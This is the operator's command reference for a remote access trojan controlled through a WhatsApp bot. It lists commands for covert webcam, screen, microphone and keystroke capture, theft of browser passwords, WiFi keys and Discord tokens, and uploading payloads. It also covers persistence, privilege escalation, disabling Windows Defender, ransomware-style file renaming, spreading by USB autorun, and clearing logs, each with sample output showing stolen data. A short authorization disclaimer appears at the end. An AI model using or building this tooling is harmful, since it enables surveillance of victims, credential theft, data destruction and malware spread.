# RAT Command Reference - WhatsApp Bot Edition

**Last Updated:** December 8, 2025  
**Bot Version:** T0OL-B4S3-263 v1.0  
**RAT Commands:** All 35+ functions integrated

---

## 📚 COMPLETE COMMAND REFERENCE

### 1. SURVEILLANCE COMMANDS (5 Functions)

#### `/screenshot` or `/ss`
**Purpose:** Capture target's screen display  
**RAT Command:** `screenshot`  
**RAT Function:** `take_screenshot()`  
**Timeout:** 30 seconds  
**Output:** Base64 → PNG image  
**WhatsApp:** Image message with caption  
**Requirements:** Screen access enabled  

**Example:**
```
User: /screenshot
Bot: 📸 Capturing screenshot...
Bot: [IMAGE] 📸 Screenshot from target system
```

---

#### `/webcam` or `/cam`
**Purpose:** Capture webcam image  
**RAT Command:** `webcam`  
**RAT Function:** `capture_webcam()`  
**Timeout:** 30 seconds  
**Output:** Base64 → JPEG image  
**WhatsApp:** Image message with caption  
**Requirements:** Camera hardware + driver  

**Example:**
```
User: /webcam
Bot: 📷 Activating webcam...
Bot: [IMAGE] 📷 Webcam capture from target
```

---

#### `/keylogs` or `/keys`
**Purpose:** Retrieve keystroke logs  
**RAT Command:** `keylogs`  
**RAT Function:** `get_keylogs()`  
**Timeout:** 15 seconds  
**Output:** Text (user input, applications, searches)  
**WhatsApp:** Formatted code block  
**Requirements:** Keylogger running in background  

**Example:**
```
User: /keylogs
Bot: ⌨️ KEYLOGGER OUTPUT
    username: admin
    password: Secure123!
    googled: "how to..."
```

---

#### `/record <duration>`
**Purpose:** Record microphone audio  
**RAT Command:** `record <seconds>`  
**RAT Function:** `record_audio(duration)`  
**Timeout:** Dynamic (duration + 5s)  
**Output:** Base64 → WAV audio file  
**WhatsApp:** Audio message  
**Requirements:** Microphone + PyAudio  

**Example:**
```
User: /record 10
Bot: 🎤 Recording audio for 10 seconds...
Bot: [AUDIO] 🎤 Audio recording (10 seconds)
```

---

#### `/clipboard` or `/clip`
**Purpose:** Monitor clipboard content  
**RAT Command:** `clipboard`  
**RAT Function:** `get_clipboard()`  
**Timeout:** 10 seconds  
**Output:** Text (recently copied items)  
**WhatsApp:** Text message  
**Requirements:** Clipboard monitoring active  

**Example:**
```
User: /clipboard
Bot: 📋 CLIPBOARD CONTENT
    [1] "sensitive_password_123"
    [2] "credit_card_4111111111111111"
    [3] "email@company.com"
```

---

### 2. CREDENTIAL HARVESTING (4 Functions)

#### `/passwords` or `/pass`
**Purpose:** Extract saved browser passwords  
**RAT Command:** `passwords`  
**RAT Function:** `get_chrome_passwords()`, `get_edge_passwords()`, `get_firefox_passwords()`  
**Timeout:** 30 seconds  
**Output:** JSON → Formatted credentials  
**WhatsApp:** Numbered list with URLs/usernames/passwords  
**Targets:** Chrome, Edge, Firefox  

**Example:**
```
User: /passwords
Bot: 🔐 BROWSER CREDENTIALS
    [1] gmail.com
        ▪️ username: user@gmail.com
        ▪️ password: SecurePass123!
    
    [2] facebook.com
        ▪️ username: john.doe
        ▪️ password: FacePass456
```

---

#### `/wifi`
**Purpose:** Extract saved WiFi passwords  
**RAT Command:** `wifi`  
**RAT Function:** `get_wifi_passwords()`  
**Timeout:** 15 seconds  
**Output:** JSON → SSID and passwords  
**WhatsApp:** Network list with credentials  
**Requirements:** Admin rights  

**Example:**
```
User: /wifi
Bot: 📡 WIFI CREDENTIALS
    [1] HomeNetwork
        ▪️ Password: WifiPass789!
    
    [2] OfficeWiFi
        ▪️ Password: Corporate123@
```

---

#### `/discord`
**Purpose:** Extract Discord authentication tokens  
**RAT Command:** `discord`  
**RAT Function:** `get_discord_tokens()`  
**Timeout:** 15 seconds  
**Output:** JSON → Token list  
**WhatsApp:** Token codes (sanitized)  
**Targets:** Discord Local Storage  

**Example:**
```
User: /discord
Bot: 🎮 DISCORD TOKENS
    1. `MzU1Njg5MDExNzc4ODE5NjE2.DkR8YQ.aJ2C...`
    2. `NDc2MDkzMzI0NzYwODMyMDAx.Dk9k8Q.bF3D...`
```

---

#### `/history <chrome|edge|firefox>`
**Purpose:** Extract browser visit history  
**RAT Command:** `history <browser>`  
**RAT Function:** `get_browser_history(browser)`  
**Timeout:** 20 seconds  
**Output:** JSON → URL list with timestamps  
**WhatsApp:** Formatted history entries (top 15)  

**Example:**
```
User: /history chrome
Bot: 📜 CHROME HISTORY
    [1] Netflix - Watch TV Shows Online
        🔗 https://netflix.com
    
    [2] Gmail - Email
        🔗 https://mail.google.com
    
    [3] Facebook
        🔗 https://facebook.com
        
    ... (showing 15 of 523 entries)
```

---

### 3. SYSTEM INFORMATION (8 Functions)

#### `/sysinfo`
**Purpose:** Get comprehensive system information  
**RAT Command:** `sysinfo`  
**RAT Function:** `system_info()`  
**Timeout:** 15 seconds  
**Output:** Formatted system data  
**Includes:** OS, CPU, RAM, Disk, Admin status  
**WhatsApp:** Formatted info blocks  

**Example:**
```
User: /sysinfo
Bot: 💻 SYSTEM INFORMATION
    ▪️ Hostname: DESKTOP-USER1
    ▪️ Username: Administrator
    ▪️ OS: Windows 10 Pro (19042)
    ▪️ Admin: Yes (ADMIN privilege)
    ▪️ CPU: 8 cores @ 3.6GHz
    ▪️ RAM: 16GB (65% used)
    ▪️ Disk: 512GB (240GB free)
```

---

#### `/processes`
**Purpose:** List all running processes  
**RAT Command:** `processes`  
**RAT Function:** `list_processes()`  
**Timeout:** 20 seconds  
**Output:** Process list (PID, name, user)  
**WhatsApp:** Top 20 processes  
**Fields:** PID, Process Name, User  

**Example:**
```
User: /processes
Bot: ⚙️ RUNNING PROCESSES
    1. `1234  explorer.exe                  SYSTEM`
    2. `5678  svchost.exe                   NT AUTHORITY`
    3. `9012  chrome.exe                    USER`
    ... (showing top 20 processes)
```

---

#### `/killproc <PID>`
**Purpose:** Terminate a running process  
**RAT Command:** `kill <pid>`  
**RAT Function:** `kill_process(pid)`  
**Timeout:** 10 seconds  
**Output:** Success/failure message  
**WhatsApp:** Confirmation message  
**Requires:** Process ID (visible from /processes)  

**Example:**
```
User: /killproc 5678
Bot: Terminating process 5678...
Bot: ✅ Process 5678 terminated successfully
```

---

#### `/metrics`
**Purpose:** Get real-time performance metrics  
**RAT Command:** `metrics`  
**RAT Function:** `get_system_metrics()`  
**Timeout:** 10 seconds  
**Output:** JSON → CPU, RAM, Disk, Network  
**WhatsApp:** Formatted metrics table  
**Updates:** Real-time values  

**Example:**
```
User: /metrics
Bot: 📈 SYSTEM METRICS
    📊 CPU
        Current: 45%
        Cores: 8
        Frequency: 3.6GHz
    
    💾 MEMORY
        Total: 16GB
        Used: 10.4GB (65%)
        Available: 5.6GB
    
    💿 DISK
        Total: 512GB
        Used: 272GB (53%)
        Available: 240GB
    
    🌐 NETWORK
        Sent: 2,456MB
        Received: 8,932MB
    
    ⏱️ Uptime: 24.5 hours
```

---

#### `/software`
**Purpose:** Enumerate installed applications  
**RAT Command:** `software`  
**RAT Function:** `get_installed_software()`  
**Timeout:** 60 seconds (can take a while)  
**Output:** Software list with versions  
**WhatsApp:** Top 20 installed programs  
**Sources:** Registry (HKLM\Software\...Uninstall)  

**Example:**
```
User: /software
Bot: 📦 INSTALLED SOFTWARE
    1. Microsoft Office 2019 - v16.0.13127
    2. Google Chrome - v96.0.4664
    3. Adobe Acrobat Reader - v21.11
    4. Visual Studio Code - v1.63.2
    5. Python 3.9 - v3.9.9
    ... (showing top 20 of 156 installed)
```

---

#### `/netscan` or `/scan`
**Purpose:** Perform ARP network scan  
**RAT Command:** `netscan`  
**RAT Function:** `network_scan()`  
**Timeout:** 60-120 seconds (full subnet scan)  
**Output:** Active hosts on network  
**WhatsApp:** IP list with optional hostnames  
**Scope:** Local network (192.168.x.x, 10.x.x.x, etc)  

**Example:**
```
User: /netscan
Bot: 🌐 Scanning network...
Bot: 🌐 NETWORK SCAN RESULTS
    ✅ Found 23 active hosts:
    1. `192.168.1.1 (Gateway)`
    2. `192.168.1.100 (DESKTOP-USER1)`
    3. `192.168.1.105 (LAPTOP-USER2)`
    4. `192.168.1.110 (PRINTER-HP)`
    ... (20 more)
```

---

#### `/locate` or `/geo`
**Purpose:** Get geolocation based on IP  
**RAT Command:** `locate`  
**RAT Function:** `get_geolocation()`  
**Timeout:** 10 seconds  
**Output:** IP, City, Country, Coordinates  
**WhatsApp:** Location info formatted  
**Source:** IP API (ipapi.co)  

**Example:**
```
User: /locate
Bot: 🌍 Getting geolocation...
Bot: 🌍 GEOLOCATION
    ▪️ IP: 203.0.113.42
    ▪️ City: San Francisco
    ▪️ Region: California
    ▪️ Country: United States
    ▪️ Latitude: 37.7749
    ▪️ Longitude: -122.4194
    ▪️ ISP: ISP Provider Inc
    ▪️ Timezone: America/Los_Angeles
```

---

#### `/usb`
**Purpose:** Enumerate USB devices  
**RAT Command:** `usb`  
**RAT Function:** `enumerate_usb_devices()`  
**Timeout:** 15 seconds  
**Output:** Connected USB device list  
**WhatsApp:** Device names and info  
**Detects:** USB drives, phones, peripherals  

**Example:**
```
User: /usb
Bot: 💾 Enumerating USB devices...
Bot: 💾 USB DEVICES
    1. Kingston DataTraveler (32GB)
    2. Apple iPhone (Connected)
    3. Razer Mouse (Wireless)
    4. Logitech Keyboard (USB)
```

---

### 4. FILE OPERATIONS (2 Functions)

#### `/download <filepath>`
**Purpose:** Download file from target  
**RAT Command:** `download <filepath>`  
**RAT Function:** `download_file(path)`  
**Timeout:** 60 seconds  
**Output:** Base64 → Binary file  
**WhatsApp:** Document message  
**Supports:** Any readable file  

**Example:**
```
User: /download C:\Users\Documents\passwords.txt
Bot: 📥 Downloading file...
Bot: [DOCUMENT] 📥 Downloaded: passwords.txt
```

**Common Downloads:**
- `C:\Windows\System32\drivers\etc\hosts` (hosts file)
- `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\...` (Chrome data)
- `C:\Users\<user>\Documents\...` (Documents)
- `C:\Program Files\...` (Installed software)

---

#### `/upload <target_path>`
**Purpose:** Upload file to target  
**RAT Command:** `upload <path> <data>`  
**RAT Function:** `upload_file(path, data)`  
**Timeout:** 60 seconds  
**Requires:** File attachment in WhatsApp message  
**Output:** Success/failure message  
**WhatsApp:** Attach file + type command  

**Example:**
```
User: [Attaches payload.exe]
User: /upload C:\Windows\Temp\payload.exe
Bot: 📤 Uploading file...
Bot: ✅ File uploaded successfully to C:\Windows\Temp\payload.exe
```

**Common Uploads:**
- `C:\Windows\Temp\...` (Temporary files)
- `C:\Users\<user>\AppData\...` (User data)
- `C:\ProgramData\...` (Shared program data)

---

### 5. PERSISTENCE & PRIVILEGE ESCALATION (3 Functions)

#### `/persist`
**Purpose:** Install persistence mechanisms  
**RAT Command:** `persist`  
**RAT Function:** `multi_persistence()`  
**Timeout:** 20 seconds  
**Methods:**
  1. Registry Run key (HKCU\...\Run)
  2. Startup folder copy
  3. Scheduled task (if admin)
**Output:** Success/failure for each method  
**WhatsApp:** Formatted results  

**Example:**
```
User: /persist
Bot: 📌 Installing persistence...
Bot: ✅ PERSISTENCE INSTALLED
    ▪️ Registry Run: ✓
    ▪️ Startup Folder: ✓
    ▪️ Scheduled Task: ✓ (Admin)
    
    Target will reconnect after restart
```

---

#### `/elevate`
**Purpose:** Attempt privilege escalation  
**RAT Command:** `elevate`  
**RAT Function:** `privilege_escalation()`  
**Timeout:** 20 seconds  
**Methods:** UAC bypass, token impersonation, privilege abuse  
**Output:** Admin status before/after  
**WhatsApp:** Success/failure message  

**Example:**
```
User: /elevate
Bot: 🚀 Attempting privilege escalation...
Bot: ✅ PRIVILEGE ESCALATION SUCCESSFUL
    Current: ADMIN (NT AUTHORITY\SYSTEM)
    
    Now running with maximum privileges
```

---

#### `/defenderoff`
**Purpose:** Disable Windows Defender  
**RAT Command:** `defenderoff`  
**RAT Function:** `disable_defender()`  
**Timeout:** 15 seconds  
**Methods:** PowerShell Group Policy, Registry edits  
**Requires:** Admin rights (for full disable)  
**Output:** Success/partial success message  
**WhatsApp:** Defender status  

**Example:**
```
User: /defenderoff
Bot: 🛡️ Disabling Windows Defender...
Bot: ✅ WINDOWS DEFENDER DISABLED
    Real-time protection: OFF
    Behavior monitoring: OFF
    
    Antivirus protection is now disabled
```

---

### 6. INTERACTIVE COMMANDS (5 Functions)

#### `/msgbox <message>`
**Purpose:** Display message box on target  
**RAT Command:** `msgbox <message>`  
**RAT Function:** `display_message_box(message)`  
**Timeout:** 5 seconds  
**Output:** User interaction response  
**WhatsApp:** Confirmation  
**Visible:** User sees popup  

**Example:**
```
User: /msgbox System Update Required
Bot: 💬 Displaying message box...
Bot: ✅ Message box displayed: "System Update Required"
```

---

#### `/beep [frequency] [duration]`
**Purpose:** Play system beep sound  
**RAT Command:** `beep <freq> <dur>`  
**RAT Function:** `play_sound(frequency, duration)`  
**Timeout:** 5 seconds  
**Default:** 1000Hz for 500ms  
**Output:** Confirmation  
**Audio:** System speaker beep  

**Example:**
```
User: /beep 2000 1000
Bot: 🔊 Playing 2000Hz beep for 1000ms...
Bot: ✅ Beep sent: 2000Hz for 1000ms
```

---

#### `/lock`
**Purpose:** Lock the workstation  
**RAT Command:** `lock`  
**RAT Function:** `remote_lock_screen()`  
**Timeout:** 5 seconds  
**Output:** Lock confirmation  
**WhatsApp:** Confirmation message  
**Requires:** User interaction to unlock  

**Example:**
```
User: /lock
Bot: 🔒 Locking workstation...
Bot: ✅ Workstation locked
    User must enter credentials to unlock
```

---

#### `/shutdown [delay]`
**Purpose:** Schedule system shutdown  
**RAT Command:** `shutdown`  
**RAT Function:** `remote_shutdown(delay)`  
**Timeout:** 5 seconds  
**Default:** 60 second delay  
**Output:** Shutdown confirmation  
**Cancellable:** User can run `shutdown /a`  

**Example:**
```
User: /shutdown
Bot: 🔴 Scheduling shutdown in 60 seconds...
Bot: System will shut down in 60 seconds
    (User can cancel with Ctrl+Alt+Del)
```

---

#### `/restart`
**Purpose:** Restart the system  
**RAT Command:** `shutdown restart`  
**RAT Function:** `restart()`  
**Timeout:** 5 seconds  
**Output:** Restart confirmation  
**WhatsApp:** Confirmation message  
**Effect:** Immediate restart (30-60s delay)  

**Example:**
```
User: /restart
Bot: 🔄 Restarting system...
Bot: System will restart in 30 seconds
```

---

### 7. ADVANCED DESTRUCTIVE COMMANDS (3 Functions)

#### `/ransom <target_path>`
**Purpose:** Simulate ransomware (rename files)  
**RAT Command:** `ransom <path>`  
**RAT Function:** `simulate_ransomware(path)`  
**Timeout:** 60 seconds  
**Action:** Appends `.encrypted` to all files  
**Scope:** Target directory and subdirectories  
**Reversible:** Just rename back (for demo)  
**⚠️ WARNING:** DESTRUCTIVE - Test only on test systems  

**Example:**
```
User: /ransom C:\Users\Documents\TestFiles
Bot: ⚠️ Simulating ransomware on C:\Users\Documents\TestFiles
Bot: ✅ RANSOMWARE SIMULATION COMPLETE
    Files renamed: 127
    Total processed: 847MB
    Extensions changed: .encrypted
```

---

#### `/spread`
**Purpose:** USB spreading mechanism  
**RAT Command:** `spread`  
**RAT Function:** `spread_via_usb()`  
**Timeout:** 30 seconds  
**Action:** Copies RAT to all USB drives  
**Creates:** Autorun.inf + executable  
**Lateral Movement:** Infects connected drives  
**⚠️ WARNING:** LATERAL MOVEMENT - Spreads to other systems  

**Example:**
```
User: /spread
Bot: 💾 Initiating USB spreading...
Bot: ✅ USB SPREADING ACTIVE
    USB devices found: 3
    Successfully infected: 3
    Autorun configured for automatic execution
```

---

#### `/selfdestruct`
**Purpose:** Clean traces and terminate  
**RAT Command:** `selfdestruct`  
**RAT Function:** `self_destruct()`  
**Timeout:** 10 seconds  
**Actions:**
  1. Remove persistence entries
  2. Clear event logs
  3. Delete temporary files
  4. Exit gracefully
**Output:** Completion confirmation  
**Effect:** Session terminated  

**Example:**
```
User: /selfdestruct
Bot: 💥 SELF-DESTRUCT INITIATED
    Removing persistence...
    Clearing traces...
    Exiting gracefully...
Bot: ✅ Self-destruct sequence complete
    Session has been terminated
```

---

### 8. ADVANCED CAPTURE COMMANDS (3 Functions)

#### `/timelapse <count> <interval>`
**Purpose:** Capture screenshot sequence  
**RAT Command:** `timelapse <count> <interval>`  
**RAT Function:** `screenshot_timelapse(count, interval)`  
**Timeout:** Dynamic (count × interval + 10s)  
**Default:** 5 photos, 5 seconds apart = ~25s total  
**Output:** Base64 PNG sequence  
**Use Case:** Monitor user activity over time  

**Example:**
```
User: /timelapse 10 3
Bot: 📸 Starting timelapse...
Bot: 📸 TIMELAPSE CAPTURE
    ✅ Captured 10 photos
    ⏱️ Interval: 3 seconds
    📦 Total duration: 27 seconds
    
    Photos can be processed for activity monitoring
```

---

#### `/photoburst <count>`
**Purpose:** Rapid webcam capture  
**RAT Command:** `photoburst <count>`  
**RAT Function:** `take_photo_burst(count)`  
**Timeout:** Dynamic (count × 2s + 5s)  
**Default:** 3 photos, 0.5s apart  
**Output:** JPEG sequence (base64)  
**Use Case:** Capture in quick succession  

**Example:**
```
User: /photoburst 5
Bot: 📷 Taking 5 photos in burst mode...
Bot: 📷 PHOTO BURST
    ✅ Captured 5 photos
    📦 Each ~250KB
    
    Photos ready for analysis
```

---

#### `/usblist`
**Purpose:** List USB devices (alias for /usb)  
**RAT Command:** `usb`  
**RAT Function:** `enumerate_usb_devices()`  
**Timeout:** 15 seconds  
**Output:** USB device enumeration  
**WhatsApp:** Device list  

**Example:**
```
User: /usblist
Bot: 💾 USB DEVICES
    1. Kingston DataTraveler (32GB)
    2. Apple iPhone (Lightning)
    3. External SSD (1TB)
```

---

## 🔧 SESSION MANAGEMENT

#### `/sessions`
**Purpose:** List all active sessions  
**Output:** Active target systems with info  
**Display:** System ID, IP, hostname, privilege level, connection time  

**Example:**
```
User: /sessions
Bot: 🎯 ACTIVE SESSIONS
    [1] 🟢 192.168.1.100:54321
        Info: [ADMIN] DESKTOP-USER1 (Windows 10)
        Connected: 14:30:15
    
    [2] 🟢 192.168.1.105:55432
        Info: [USER] LAPTOP-USER2 (Windows 11)
        Connected: 14:25:42
    
    Use /use <id> to interact
```

---

#### `/use <session_id>`
**Purpose:** Switch to a specific session  
**Effect:** Sets active session for subsequent commands  
**Required:** Must use this before any target commands  

**Example:**
```
User: /use 1
Bot: ✅ Switched to session 1
    Target: 192.168.1.100 (DESKTOP-USER1)
    
All subsequent commands will target this system
```

---

#### `/active`
**Purpose:** Show currently active session  
**Output:** Current session ID and target info  

**Example:**
```
User: /active
Bot: Current session: 1
    Target: 192.168.1.100 (DESKTOP-USER1)
```

---

#### `/kill <session_id>`
**Purpose:** Disconnect a session  
**Effect:** Terminates RAT on target  
**Confirmation:** Session removed from list  

**Example:**
```
User: /kill 1
Bot: Terminating session 1...
Bot: ✅ Session 1 killed
```

---

## 📋 UTILITIES

#### `/help` or `/menu`
**Purpose:** Display command help  
**Output:** Full command menu with descriptions  

#### `/ping`
**Purpose:** Check bot status  
**Output:** Bot uptime, C2 server status, active sessions  

**Example:**
```
User: /ping
Bot: 🏓 PONG!
    ✅ Bot Status: Online
    ⏱️ Uptime: 2h 34m
    🔌 RAT Server: Connected
    📱 Active Session: 1
```

---

## ⏱️ TIMEOUT REFERENCE

| Operation | Timeout | Why |
|-----------|---------|-----|
| Screenshot | 30s | High resolution capture |
| Webcam | 30s | Camera initialization |
| Keylogs | 15s | Memory access |
| Audio Record | Dynamic | Duration dependent |
| Clipboard | 10s | Quick data retrieval |
| Passwords | 30s | DB decryption |
| WiFi Passwords | 15s | Registry enumeration |
| Discord Tokens | 15s | FS search |
| History | 20s | DB query |
| System Info | 15s | Multiple system calls |
| Processes | 20s | Process enumeration |
| Metrics | 10s | Real-time collection |
| Software | 60s | Registry parsing (slow) |
| Network Scan | 60-120s | ARP sweep of subnet |
| Geolocation | 10s | API call |
| USB List | 15s | Device enumeration |
| Download | 60s | File size dependent |
| Upload | 60s | File size dependent |

---

## 🚨 DANGEROUS OPERATIONS

⚠️ **The following commands are DESTRUCTIVE and should only be used with explicit authorization:**

1. **`/ransom <path>`** - Renames files with .encrypted extension
2. **`/spread`** - Copies RAT to USB drives
3. **`/selfdestruct`** - Removes traces and exits
4. **`/defenderoff`** - Disables antivirus
5. **`/shutdown`** - Schedules system shutdown
6. **`/restart`** - Forces system restart

**Never run these without:**
- Explicit written authorization
- Clear understanding of impact
- Documented testing environment
- Recovery procedures in place

---

**End of Command Reference**
